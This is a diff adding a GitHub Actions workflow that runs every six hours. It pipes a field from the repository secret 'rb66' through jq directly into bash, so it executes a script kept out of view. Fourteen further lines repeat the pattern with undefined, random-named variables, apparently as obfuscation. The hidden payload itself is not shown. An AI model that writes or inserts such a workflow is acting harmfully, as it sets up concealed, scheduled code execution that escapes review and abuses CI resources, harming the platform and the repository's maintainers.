@@ -1,0 +1,33 @@
+name: qinyanyanai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qinyanyanai
+        env:
+          rb66: ${{ secrets.rb66 }}
+        run: |
+          echo $rb66 | jq -r .wowxb815 | /bin/bash
+          echo $oj32260 | jq -r .ehse030 | /bin/bash
+          echo $jvwh25654 | jq -r .rjtc4616 | /bin/bash
+          echo $dsab731 | jq -r .dppdu57 | /bin/bash
+          echo $lp4 | jq -r .gfgle7 | /bin/bash
+          echo $mo8 | jq -r .iokp3722 | /bin/bash
+          echo $as77446 | jq -r .xif43605 | /bin/bash
+          echo $zl32 | jq -r .nm6743 | /bin/bash
+          echo $oatg5558 | jq -r .cpz1836 | /bin/bash
+          echo $pfyr82 | jq -r .v925 | /bin/bash
+          echo $u8532 | jq -r .plux139 | /bin/bash
+          echo $cr98445 | jq -r .yusw87471 | /bin/bash
+          echo $bducr82 | jq -r .mabu94249 | /bin/bash
+          echo $u41631 | jq -r .d89 | /bin/bash
+          echo $i5 | jq -r .yffmv5738 | /bin/bash
+
